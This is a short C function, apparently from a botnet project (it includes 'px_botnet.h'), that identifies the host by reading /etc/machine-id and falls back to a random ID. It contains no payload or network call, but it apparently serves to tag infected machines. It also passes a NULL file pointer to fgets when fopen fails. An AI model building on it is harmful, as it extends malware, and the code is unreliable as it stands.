#include "../includes/px_botnet.h"

char *ft_get_id(void)
{
	const unsigned MAX_LENGTH = 1024;
	char buffer[MAX_LENGTH];
	int		error;
	char *id;
	char *tmp;
	FILE *fp = fopen("/etc/machine-id", "r");

	error = 0;
	if (!fp)
		error = 1;
	if (fgets(buffer, MAX_LENGTH, fp))
	{
		id = ft_strdup(buffer);
		id[strlen(id) - 1] = '\0';
		fclose(fp);
	}
	else
		error = 1;
	if (error)
	{
		srand(time(NULL));
		tmp = ft_itoa(rand());
		tmp = ft_strnjoinf("random_id-", tmp, strlen(tmp));
		id = ft_strdup(tmp);
	}
	return (id);
}
